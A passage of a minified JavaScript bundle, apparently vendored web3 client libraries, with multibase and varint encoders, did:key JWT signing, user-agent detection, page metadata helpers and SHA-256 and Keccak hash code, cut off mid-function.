Ib=Ne({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),Sb=Ne({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),Db=Ne({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),Ab=Ne({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),Ob=Ne({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),$b=Ne({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Cb=Ne({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),Pb=Ne({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),Tb=Ne({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var Bb=Object.freeze({__proto__:null,base32:Ib,base32upper:Sb,base32pad:Db,base32padupper:Ab,base32hex:Ob,base32hexupper:$b,base32hexpad:Cb,base32hexpadupper:Pb,base32z:Tb});const Rb=Pi({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),kb=Pi({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var Nb=Object.freeze({__proto__:null,base36:Rb,base36upper:kb});const Ub=Pi({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),Mb=Pi({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var Lb=Object.freeze({__proto__:null,base58btc:Ub,base58flickr:Mb});const Fb=Ne({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),jb=Ne({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),qb=Ne({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),zb=Ne({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var Vb=Object.freeze({__proto__:null,base64:Fb,base64pad:jb,base64url:qb,base64urlpad:zb});const gd=Array.from(""),Wb=gd.reduce((t,e,n)=>(t[n]=e,t),[]),Kb=gd.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function Hb(t){return t.reduce((e,n)=>(e+=Wb[n],e),"")}function Gb(t){const e=[];for(const n of t){const r=Kb[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const Yb=Ws({prefix:"",name:"base256emoji",encode:Hb,decode:Gb});var Zb=Object.freeze({__proto__:null,base256emoji:Yb}),Xb=yd,iu=128,Jb=-128,Qb=Math.pow(2,31);function yd(t,e,n){e=e||[],n=n||0;for(var r=n;t>=Qb;)e[n++]=t&255|iu,t/=128;for(;t&Jb;)e[n++]=t&255|iu,t>>>=7;return e[n]=t|0,yd.bytes=n-r+1,e}var e1=Da,t1=128,su=127;function Da(t,r){var n=0,r=r||0,i=0,s=r,o,a=t.length;do{if(s>=a)throw Da.bytes=0,new RangeError("Could not decode varint");o=t[s++],n+=i<28?(o&su)<<i:(o&su)*Math.pow(2,i),i+=7}while(o>=t1);return Da.bytes=s-r,n}var n1=Math.pow(2,7),r1=Math.pow(2,14),i1=Math.pow(2,21),s1=Math.pow(2,28),o1=Math.pow(2,35),a1=Math.pow(2,42),c1=Math.pow(2,49),l1=Math.pow(2,56),u1=Math.pow(2,63),h1=function(t){return t<n1?1:t<r1?2:t<i1?3:t<s1?4:t<o1?5:t<a1?6:t<c1?7:t<l1?8:t<u1?9:10},f1={encode:Xb,decode:e1,encodingLength:h1},md=f1;const ou=(t,e,n=0)=>(md.encode(t,e,n),e),au=t=>md.encodingLength(t),Aa=(t,e)=>{const n=e.byteLength,r=au(t),i=r+au(n),s=new Uint8Array(i+n);return ou(t,s,0),ou(n,s,r),s.set(e,i),new d1(t,n,e,s)};let d1=class{constructor(e,n,r,i){this.code=e,this.size=n,this.digest=r,this.bytes=i}};const wd=({name:t,code:e,encode:n})=>new p1(t,e,n);let p1=class{constructor(e,n,r){this.name=e,this.code=n,this.encode=r}digest(e){if(e instanceof Uint8Array){const n=this.encode(e);return n instanceof Uint8Array?Aa(this.code,n):n.then(r=>Aa(this.code,r))}else throw Error("Unknown type, must be binary type")}};const bd=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),g1=wd({name:"sha2-256",code:18,encode:bd("SHA-256")}),y1=wd({name:"sha2-512",code:19,encode:bd("SHA-512")});var m1=Object.freeze({__proto__:null,sha256:g1,sha512:y1});const vd=0,w1="identity",Ed=dd,b1=t=>Aa(vd,Ed(t)),v1={code:vd,name:w1,encode:Ed,digest:b1};var E1=Object.freeze({__proto__:null,identity:v1});new TextEncoder,new TextDecoder;const cu={...pb,...yb,...wb,...vb,..._b,...Bb,...Nb,...Lb,...Vb,...Zb};({...m1,...E1});function xd(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const lu=xd("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),$o=xd("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=hd(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),_d={utf8:lu,"utf-8":lu,hex:cu.base16,latin1:$o,ascii:$o,binary:$o,...cu};function Ks(t,e="utf8"){const n=_d[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}function qr(t,e="utf8"){const n=_d[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?$c(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function uu(t){return Br(Ks(qr(t,Vs),ld))}function _s(t){return Ks(qr(rr(t),ld),Vs)}function Id(t){const e=qr(eb,ru),n=Qw+Ks(fd([e,t]),ru);return[Xw,Jw,n].join(Zw)}function x1(t){return Ks(t,Vs)}function _1(t){return qr(t,Vs)}function I1(t){return qr([_s(t.header),_s(t.payload)].join(xs),ud)}function S1(t){return[_s(t.header),_s(t.payload),x1(t.signature)].join(xs)}function Oa(t){const e=t.split(xs),n=uu(e[0]),r=uu(e[1]),i=_1(e[2]),s=qr(e.slice(0,2).join(xs),ud);return{header:n,payload:r,signature:i,data:s}}function hu(t=Jf(tb)){const e=cd.getPublicKey(t);return{secretKey:fd([t,e]),publicKey:e}}async function D1(t,e,n,r,i=z.fromMiliseconds(Date.now())){const s={alg:Gw,typ:Yw},o=Id(r.publicKey),a=i+n,c={iss:o,sub:t,aud:e,iat:i,exp:a},l=I1({header:s,payload:c}),u=cd.sign(l,r.secretKey.slice(0,32));return S1({header:s,payload:c,signature:u})}var fu=function(t,e,n){if(n||arguments.length===2)for(var r=0,i=e.length,s;r<i;r++)(s||!(r in e))&&(s||(s=Array.prototype.slice.call(e,0,r)),s[r]=e[r]);return t.concat(s||Array.prototype.slice.call(e))},A1=(function(){function t(e,n,r){this.name=e,this.version=n,this.os=r,this.type="browser"}return t})(),O1=(function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t})(),$1=(function(){function t(e,n,r,i){this.name=e,this.version=n,this.os=r,this.bot=i,this.type="bot-device"}return t})(),C1=(function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t})(),P1=(function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t})(),T1=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,B1=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,du=3,R1=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",T1]],pu=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function k1(t){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new P1:typeof navigator<"u"?U1(navigator.userAgent):L1()}function N1(t){return t!==""&&R1.reduce(function(e,n){var r=n[0],i=n[1];if(e)return e;var s=i.exec(t);return!!s&&[r,s]},!1)}function U1(t){var e=N1(t);if(!e)return null;var n=e[0],r=e[1];if(n==="searchbot")return new C1;var i=r[1]&&r[1].split(".").join("_").split("_").slice(0,3);i?i.length<du&&(i=fu(fu([],i,!0),F1(du-i.length),!0)):i=[];var s=i.join("."),o=M1(t),a=B1.exec(t);return a&&a[1]?new $1(n,s,o,a[1]):new A1(n,s,o)}function M1(t){for(var e=0,n=pu.length;e<n;e++){var r=pu[e],i=r[0],s=r[1],o=s.exec(t);if(o)return i}return null}function L1(){var t=typeof process<"u"&&process.version;return t?new O1(process.version.slice(1)):null}function F1(t){for(var e=[],n=0;n<t;n++)e.push("0");return e}var ae={},gu;function Sd(){if(gu)return ae;gu=1,Object.defineProperty(ae,"__esModule",{value:!0}),ae.getLocalStorage=ae.getLocalStorageOrThrow=ae.getCrypto=ae.getCryptoOrThrow=ae.getLocation=ae.getLocationOrThrow=ae.getNavigator=ae.getNavigatorOrThrow=ae.getDocument=ae.getDocumentOrThrow=ae.getFromWindowOrThrow=ae.getFromWindow=void 0;function t(f){let p;return typeof window<"u"&&typeof window[f]<"u"&&(p=window[f]),p}ae.getFromWindow=t;function e(f){const p=t(f);if(!p)throw new Error(`${f} is not defined in Window`);return p}ae.getFromWindowOrThrow=e;function n(){return e("document")}ae.getDocumentOrThrow=n;function r(){return t("document")}ae.getDocument=r;function i(){return e("navigator")}ae.getNavigatorOrThrow=i;function s(){return t("navigator")}ae.getNavigator=s;function o(){return e("location")}ae.getLocationOrThrow=o;function a(){return t("location")}ae.getLocation=a;function c(){return e("crypto")}ae.getCryptoOrThrow=c;function l(){return t("crypto")}ae.getCrypto=l;function u(){return e("localStorage")}ae.getLocalStorageOrThrow=u;function h(){return t("localStorage")}return ae.getLocalStorage=h,ae}var cn=Sd(),Yr={},yu;function j1(){if(yu)return Yr;yu=1,Object.defineProperty(Yr,"__esModule",{value:!0}),Yr.getWindowMetadata=void 0;const t=Sd();function e(){let n,r;try{n=t.getDocumentOrThrow(),r=t.getLocationOrThrow()}catch{return null}function i(){const p=n.getElementsByTagName("link"),d=[];for(let g=0;g<p.length;g++){const w=p[g],_=w.getAttribute("rel");if(_&&_.toLowerCase().indexOf("icon")>-1){const C=w.getAttribute("href");if(C)if(C.toLowerCase().indexOf("https:")===-1&&C.toLowerCase().indexOf("http:")===-1&&C.indexOf("//")!==0){let v=r.protocol+"//"+r.host;if(C.indexOf("/")===0)v+=C;else{const b=r.pathname.split("/");b.pop();const x=b.join("/");v+=x+"/"+C}d.push(v)}else if(C.indexOf("//")===0){const v=r.protocol+C;d.push(v)}else d.push(C)}}return d}function s(...p){const d=n.getElementsByTagName("meta");for(let g=0;g<d.length;g++){const w=d[g],_=["itemprop","property","name"].map(C=>w.getAttribute(C)).filter(C=>C?p.includes(C):!1);if(_.length&&_){const C=w.getAttribute("content");if(C)return C}}return""}function o(){let p=s("name","og:site_name","og:title","twitter:title");return p||(p=n.title),p}function a(){return s("description","og:description","twitter:description","keywords")}const c=o(),l=a(),u=r.origin,h=i();return{description:l,url:u,icons:h,name:c}}return Yr.getWindowMetadata=e,Yr}var q1=j1();const z1="0.1.1";function V1(){return z1}class fe extends Error{constructor(e,n={}){const r=(()=>{if(n.cause instanceof fe){if(n.cause.details)return n.cause.details;if(n.cause.shortMessage)return n.cause.shortMessage}return n.cause&&"details"in n.cause&&typeof n.cause.details=="string"?n.cause.details:n.cause?.message?n.cause.message:n.details})(),i=n.cause instanceof fe&&n.cause.docsPath||n.docsPath,o=`https://oxlib.sh${i??""}`,a=[e||"An error occurred.",...n.metaMessages?["",...n.metaMessages]:[],...r||i?["",r?`Details: ${r}`:void 0,i?`See: ${o}`:void 0]:[]].filter(c=>typeof c=="string").join(`
`);super(a,n.cause?{cause:n.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:`ox@${V1()}`}),this.cause=n.cause,this.details=r,this.docs=o,this.docsPath=i,this.shortMessage=e}walk(e){return Dd(this,e)}}function Dd(t,e){return e?.(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause?Dd(t.cause,e):e?null:t}const wr=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function W1(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function xi(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function ir(t,...e){if(!W1(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function K1(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");xi(t.outputLen),xi(t.blockLen)}function Rr(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Ad(t,e){ir(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function H1(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function kr(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function Co(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Rt(t,e){return t<<32-e|t>>>e}const G1=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function Y1(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function Z1(t){for(let e=0;e<t.length;e++)t[e]=Y1(t[e]);return t}const mu=G1?t=>t:Z1;function X1(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function Hs(t){return typeof t=="string"&&(t=X1(t)),ir(t),t}function J1(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];ir(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}class Cc{}function Od(t){const e=r=>t().update(Hs(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function Q1(t=32){if(wr&&typeof wr.getRandomValues=="function")return wr.getRandomValues(new Uint8Array(t));if(wr&&typeof wr.randomBytes=="function")return Uint8Array.from(wr.randomBytes(t));throw new Error("crypto.getRandomValues must be defined")}function ev(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}function tv(t,e,n){return t&e^~t&n}function nv(t,e,n){return t&e^t&n^e&n}class rv extends Cc{constructor(e,n,r,i){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.buffer=new Uint8Array(e),this.view=Co(this.buffer)}update(e){Rr(this),e=Hs(e),ir(e);const{view:n,buffer:r,blockLen:i}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Co(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Rr(this),Ad(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,kr(this.buffer.subarray(o)),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;ev(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=Co(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=i,e.pos=a,i%n&&e.buffer.set(r),e}clone(){return this._cloneInto()}}const fn=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Zi=BigInt(2**32-1),wu=BigInt(32);function iv(t,e=!1){return e?{h:Number(t&Zi),l:Number(t>>wu&Zi)}:{h:Number(t>>wu&Zi)|0,l:Number(t&Zi)|0}}function sv(t,e=!1){const n=t.length;let r=new Uint32Array(n),i=new Uint32Array(n);for(let s=0;s<n;s++){const{h:o,l:a}=iv(t[s],e);[r[s],i[s]]=[o,a]}return[r,i]}const ov=(t,e,n)=>t<<n|e>>>32-n,av=(t,e,n)=>e<<n|t>>>32-n,cv=(t,e,n)=>e<<n-32|t>>>64-n,lv=(t,e,n)=>t<<n-32|e>>>64-n,uv=BigInt(0),Zr=BigInt(1),hv=BigInt(2),fv=BigInt(7),dv=BigInt(256),pv=BigInt(113),$d=[],Cd=[],Pd=[];for(let t=0,e=Zr,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],$d.push(2*(5*r+n)),Cd.push((t+1)*(t+2)/2%64);let i=uv;for(let s=0;s<7;s++)e=(e<<Zr^(e>>fv)*pv)%dv,e&hv&&(i^=Zr<<(Zr<<BigInt(s))-Zr);Pd.push(i)}const Td=sv(Pd,!0),gv=Td[0],yv=Td[1],bu=(t,e,n)=>n>32?cv(t,e,n):ov(t,e,n),vu=(t,e,n)=>n>32?lv(t,e,n):av(t,e,n);function mv(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let o=0;o<10;o++)n[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=n[c],u=n[c+1],h=bu(l,u,1)^n[a],f=vu(l,u,1)^n[a+1];for(let p=0;p<50;p+=10)t[o+p]^=h,t[o+p+1]^=f}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Cd[o],c=bu(i,s,a),l=vu(i,s,a),u=$d[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)n[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~n[(a+2)%10]&n[(a+4)%10]}t[0]^=gv[r],t[1]^=yv[r]}kr(n)}class Pc extends Cc{constructor(e,n,r,i=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=s,xi(r),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=H1(this.state)}clone(){return this._cloneInto()}keccak(){mu(this.state32),mv(this.state32,this.rounds),mu(this.state32),this.posOut=0,this.pos=0}update(e){Rr(this),e=Hs(e),ir(e);const{blockLen:n,state:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);for(let a=0;a<o;a++)r[this.pos++]^=e[s++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Rr(this,!1),ir(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,s=e.length;i<s;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,s-i);e.set(n.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return xi(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Ad(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,kr(this.state)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new Pc(n,r,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=r,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}}const wv=(t,e,n)=>Od(()=>new Pc(e,t,n)),bv=wv(1,136,256/8),vv=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),dn=new Uint32Array(64);class Ev extends rv{constructor(e=32){super(64,e,8,!1),this.A=fn[0]|0,this.B=fn[1]|0,this.C=fn[2]|0,this.D=fn[3]|0,this.E=fn[4]|0,this.F=fn[5]|0,this.G=fn[6]|0,this.H=fn[7]|0}get(){const{A:e,B:n,C:r,D:i,E:s,F:o,G:a,H:c}=this;return[e,n,r,i,s,o,a,c]}set(e,n,r,i,s,o,a,c){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,n){for(let h=0;h<16;h++,n+=4)dn[h]=e.getUint32(n,!1);for(let h=16;h<64;h++){const f=dn[h-15],p=dn[h-2],d=Rt(f,7)^Rt(f,18)^f>>>3,g=Rt(p,17)^Rt(p,19)^p>>>10;dn[h]=g+dn[h-7]+d+dn[h-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let h=0;h<64;h++){const f=Rt(a,6)^Rt(a,11)^Rt(a,25),p=u+f+tv(a,c,l)+vv[h]+dn[h]|0,g=(Rt(r,2)^Rt(r,13)^Rt(r,22))+nv(r,i,s)|0;u=l,l=c,c=a,a=o+p|0,o=s,s=i,i=r,r=p+g|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(r,i,s,o,a,c,l,u)}roundClean(){kr(dn)}destroy(){this.set(0,0,0,0,0,0,0,0),kr(this.buffer)}}const xv=Od(()=>new Ev);const Tc=BigInt(0),$a=BigInt(1);function Ti(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Bc(t){if(!Ti(t))throw new Error("Uint8Array expected")}function _i(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}function Xi(t){const e=t.toString(16);return e.length&1?"0"+e:e}function Bd(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Tc:BigInt("0x"+t)}const Rd=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",_v=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Ii(t){if(Bc(t),Rd)return t.toHex();let e="";for(let n=0;n<t.length;n++)e+=_v[t[n]];return e}const Ht={_0:48,_9:57,A:65,F:70,a:97,f:102};function Eu(t){if(t>=Ht._0&&t<=Ht._9)return t-Ht._0;if(t>=Ht.A&&t<=Ht.F)return t-(Ht.A-10);if(t>=Ht.a&&t<=Ht.f)return t-(Ht.a-10)}function Is(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);if(Rd)return Uint8Array.fromHex(t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=Eu(t.charCodeAt(s)),a=Eu(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function tr(t){return Bd(Ii(t))}function kd(t){return Bc(t),Bd(Ii(Uint8Array.from(t).reverse()))}function Bi(t,e){return Is(t.toString(16).padStart(e*2,"0"))}function Nd(t,e){return Bi(t,e).reverse()}function wt(t,e,n){let r;if(typeof e=="string")try{r=Is(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Ti(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function Ss(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Bc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const 